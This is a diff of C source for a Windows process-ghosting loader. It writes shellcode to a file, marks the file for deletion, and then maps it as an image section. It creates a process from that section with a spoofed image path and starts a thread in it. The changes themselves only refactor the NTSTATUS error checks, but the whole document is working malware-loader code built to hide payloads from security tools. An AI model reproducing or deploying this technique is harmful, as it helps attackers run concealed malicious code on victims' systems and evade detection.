@@ -220,7 +220,7 @@ BOOL CreateGhostFile(wchar_t* url, HANDLE* pFileHandle) {
 
     IO_STATUS_BLOCK ioStatus;
     // HANDLE hFile;
-    NTSTATUS status = nt_func.NtCreateFile(
+    if ((status = nt_func.NtCreateFile(
         pFileHandle,
         FILE_GENERIC_WRITE | FILE_GENERIC_READ | FILE_GENERIC_EXECUTE | DELETE | SYNCHRONIZE,
         &objAttr,
@@ -231,10 +231,8 @@ BOOL CreateGhostFile(wchar_t* url, HANDLE* pFileHandle) {
         FILE_OVERWRITE_IF,
         FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
         NULL,
-        0
-        );
-
-    if (status != 0) {
+        0)) != STATUS_SUCCESS)
+    {
         wprintf(L"NtCreateFile failed: 0x%08X\n", status);
         return FALSE;
     }
@@ -261,7 +259,7 @@ BOOL CreateGhostFile(wchar_t* url, HANDLE* pFileHandle) {
     while (totalWritten < bufferLength) {
         ULONG toWrite = (bufferLength - totalWritten) > CHUNK_SIZE ? CHUNK_SIZE : (ULONG)(bufferLength - totalWritten);
 
-        status = nt_func.NtWriteFile(
+        if ((status = nt_func.NtWriteFile(
             *pFileHandle,
             NULL,
             NULL,
@@ -270,10 +268,8 @@ BOOL CreateGhostFile(wchar_t* url, HANDLE* pFileHandle) {
             shellcode + totalWritten,
             toWrite,
             &offset,
-            NULL
-            );
-
-        if (status != 0) {
+            NULL)) != STATUS_SUCCESS)
+        {
             wprintf(L"NtWriteFile failed: 0x%08X\n", status);
             break;
         }
@@ -285,15 +281,13 @@ BOOL CreateGhostFile(wchar_t* url, HANDLE* pFileHandle) {
     free(url);
 
     FILE_DISPOSITION_INFORMATION fdi = { TRUE };
-    status = nt_func.NtSetInformationFile(
+    if ((status = nt_func.NtSetInformationFile(
         *pFileHandle,
         &ioStatus,
         &fdi,
         sizeof(fdi),
-        FileDispositionInformation
-        );
-
-    if (status != 0) {
+        FileDispositionInformation)) != STATUS_SUCCESS)
+    {
         wprintf(L"NtSetInformationFile failed: 0x%08X\n", status);
         return FALSE;
     }
@@ -303,17 +297,15 @@ BOOL CreateGhostFile(wchar_t* url, HANDLE* pFileHandle) {
 
 BOOL CreateGhostSection(IN HANDLE* pFileHandle, OUT HANDLE* pSectionHandle) {
 
-    status = nt_func.NtCreateSection(
+    if ((status = nt_func.NtCreateSection(
         pSectionHandle,
         SECTION_ALL_ACCESS,
         NULL,
         0X00,
         PAGE_READONLY,
         SEC_IMAGE,
-        *pFileHandle
-    );
-
-    if (status != 0) {
+        *pFileHandle)) != STATUS_SUCCESS)
+    {
         wprintf(L"NtCreateSection failed: 0x%08X\n", status);
         return FALSE;
     }
@@ -340,20 +332,17 @@ BOOL InitialiseGhostProcessParams(IN HANDLE hProcess, IN LPWSTR SpoofProcess, OU
     }
 
     nt_func.RtlInitUnicodeString(&imagePath, SpoofProcess);
-    //nt_func.RtlInitUnicodeString(&imagePath, L"");
 
-    status = nt_func.RtlCreateProcessParametersEx(
-        &procParams,
-        &imagePath,        // Spoofed, not actual file on disk
-        NULL,
-        NULL,
-        &imagePath,        // Used as CommandLine too
-        pEnvironment,
-        NULL,NULL,NULL,NULL,
-        RTL_USER_PROC_PARAMS_NORMALIZED
-    );
-
-    if (status != 0) {
+    if ((status = nt_func.RtlCreateProcessParametersEx(
+            &procParams,
+            &imagePath,        // Spoofed, not actual file on disk
+            NULL,
+            NULL,
+            &imagePath,        // Used as CommandLine too
+            pEnvironment,
+            NULL, NULL, NULL, NULL,
+            RTL_USER_PROC_PARAMS_NORMALIZED)) != STATUS_SUCCESS)
+    {
         wprintf(L"RtlCreateProcessParametersEx failed: 0x%08X\n", status);
         return FALSE;
     }
@@ -363,27 +352,24 @@ BOOL InitialiseGhostProcessParams(IN HANDLE hProcess, IN LPWSTR SpoofProcess, OU
         return FALSE;
     }
 
-    status = nt_func.NtQueryInformationProcess(
+    if ((status = nt_func.NtQueryInformationProcess(
         hProcess,
         ProcessBasicInformation,
         &procBasicInfo,
         sizeof(PROCESS_BASIC_INFORMATION),
-        NULL
-        );
-
-    if (status != 0) {
+        NULL)) != STATUS_SUCCESS)
+    {
         wprintf(L"NtQueryInformationProcess failed: 0x%08X\n", status);
         return FALSE;
     }
 
-    status = nt_func.NtReadVirtualMemory(
+    if ((status = nt_func.NtReadVirtualMemory(
         hProcess,
         procBasicInfo.PebBaseAddress,
         &ProcEnvBlock,
         sizeof(PEB),
-        NULL);
-
-    if (status != 0) {
+        NULL)) != STATUS_SUCCESS)
+    {
         wprintf(L"NtReadVirtualMemory failed: 0x%08X\n", status);
         return FALSE;
     }
@@ -417,53 +403,54 @@ BOOL InitialiseGhostProcessParams(IN HANDLE hProcess, IN LPWSTR SpoofProcess, OU
     // set a temp ptr of procParams
     tempPtrAddress = procParams;
 
-    status = nt_func.NtAllocateVirtualMemory(
+    if ((status = nt_func.NtAllocateVirtualMemory(
         hProcess,
         &tempPtrAddress,
         0x00,
         &userEnvAndParamsSize,
         MEM_COMMIT|MEM_RESERVE,
-        PAGE_READWRITE);
-
-    if (status != 0) {
+        PAGE_READWRITE)) != STATUS_SUCCESS)
+    {
         wprintf(L"NtAllocateVirtualMemory failed: 0x%08X\n", status);
         return FALSE;
     }
 
-    status = nt_func.NtWriteVirtualMemory(
+    if ((status = nt_func.NtWriteVirtualMemory(
         hProcess,
         procParams,
         procParams,
         procParams->Length,
-        &NBytesWritten);
-
-    if (status != 0) {
+        &NBytesWritten)) != STATUS_SUCCESS)
+    {
         wprintf(L"NtWriteVirtualMemory failed: 0x%08X\n", status);
         return FALSE;
     }
 
     if (procParams->Environment) {
         // write peb process params environment
-        status = nt_func.NtWriteVirtualMemory(
+        if ((status = nt_func.NtWriteVirtualMemory(
             hProcess,
             (LPVOID)(procParams->Environment),
             (LPVOID)procParams->Environment,
             procParams->EnvironmentSize,
-            &NBytesWritten);
-
-        if (status != 0) {
+            &NBytesWritten)) != STATUS_SUCCESS)
+        {
             wprintf(L"NtWriteVirtualMemory failed: 0x%08X\n", status);
             return FALSE;
         }
     }
 
     // update the address of process parameters in the process to point to new location
-    status = nt_func.NtWriteVirtualMemory(
+    if ((status = nt_func.NtWriteVirtualMemory(
         hProcess,
         &procBasicInfo.PebBaseAddress->ProcessParameters,
         &procParams,
         sizeof(PVOID),
-        &NBytesWritten);
+        &NBytesWritten)) != STATUS_SUCCESS)
+    {
+        wprintf(L"NtWriteVirtualMemory failed: 0x%08X\n", status);
+        return FALSE;
+    }
 
     return TRUE;
 }
@@ -516,7 +503,7 @@ BOOL CreateGhostProcess(IN LPWSTR SpoofExe, IN HANDLE* phGhostSection) {
         return FALSE;
     }
 
-    status = nt_func.NtCreateProcessEx(
+    if ((status = nt_func.NtCreateProcessEx(
         &hProcess,
         PROCESS_ALL_ACCESS,
         NULL,
@@ -525,10 +512,8 @@ BOOL CreateGhostProcess(IN LPWSTR SpoofExe, IN HANDLE* phGhostSection) {
         *phGhostSection,
         NULL,
         NULL,
-        FALSE
-        );
-
-    if (status != 0) {
+        FALSE)) != STATUS_SUCCESS)
+    {
         printf("NtCreateProcessEx failed: 0x%08X\n", status);
         return FALSE;
     }
@@ -560,7 +545,7 @@ BOOL CreateGhostProcess(IN LPWSTR SpoofExe, IN HANDLE* phGhostSection) {
     //getchar();
 
     // Create the primary thread in the ghost process
-    status = nt_func.NtCreateThreadEx(
+    if ((status = nt_func.NtCreateThreadEx(
         &hThread,
         THREAD_ALL_ACCESS,
         NULL,
@@ -571,9 +556,8 @@ BOOL CreateGhostProcess(IN LPWSTR SpoofExe, IN HANDLE* phGhostSection) {
         0X00,
         0X00,
         0X00,
-        NULL);
-
-    if (status != 0) {
+        NULL)) != STATUS_SUCCESS)
+    {
         printf("NtCreateThreadEx failed: 0x%08X\n", status);
         return FALSE;
     }
